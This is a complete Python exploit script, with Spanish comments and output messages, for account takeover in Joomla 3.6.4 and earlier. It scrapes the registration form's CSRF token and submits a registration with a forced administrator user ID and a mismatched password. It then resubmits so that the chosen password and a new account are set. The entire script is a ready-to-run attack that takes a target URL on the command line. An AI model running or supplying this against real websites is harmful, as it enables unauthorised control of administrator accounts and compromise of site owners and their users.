#!/usr/bin/python3
# Joomla! <= 3.6.4 Admin TakeOver

import bs4
import requests
import random
import argparse

ADMIN_ID = 230
PASSWORD = 'MaineIsToo123'

def main(target_url):
    if not target_url.endswith('/'):
        target_url += '/'

    form_url = target_url + 'index.php/component/users/?view=registration'
    action_url = target_url + 'index.php/component/users/?task=registration.register'

    username = 'user%d' % random.randrange(1000, 10000)
    email = f'{username}@maine.com'

    session = requests.Session()

    # Paso 1: Obtener el token CSRF y otros datos ocultos
    response = session.get(form_url)
    soup = bs4.BeautifulSoup(response.text, 'lxml')
    form = soup.find('form', id='member-registration')
    if not form:
        print('[!] No se encontró el formulario de registro')
        return

    data = {e['name']: e.get('value', '') for e in form.find_all('input') if e.has_attr('name')}

    # Paso 2: Preparar datos maliciosos con ID de admin
    user_data = {
        'name': username,
        'username': username,
        'password1': PASSWORD,
        'password2': PASSWORD + 'XXXinvalid',  # Contraseña no coincidente en el primer intento
        'email1': email,
        'email2': email,
        'id': str(ADMIN_ID)
    }

    user_data = {'jform[%s]' % k: v for k, v in user_data.items()}
    data.update(user_data)

    # Primer intento con contraseña incorrecta
    response = session.post(action_url, data=data)
    if response.status_code != 200:
        print('[!] Primer intento fallido, código HTTP:', response.status_code)

    # Segundo intento sin el campo 'id' y contraseña válida
    data['jform[password2]'] = data['jform[password1]']
    del data['jform[id]']
    response = session.post(action_url, data=data)

    if 'registration' not in response.url and response.status_code == 200:
        print(f"[+] Cuenta creada correctamente: {username} / {PASSWORD}")
        print(f"[+] Email: {email}")
    else:
        print("[!] Falló la creación de cuenta. Revisa la URL y si el sitio está vulnerable.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exploit Joomla! <= 3.6.4 - Admin TakeOver')
    parser.add_argument('--url', required=True, help='URL del sitio Joomla objetivo (con http/https)')
    args = parser.parse_args()
    main(args.url)
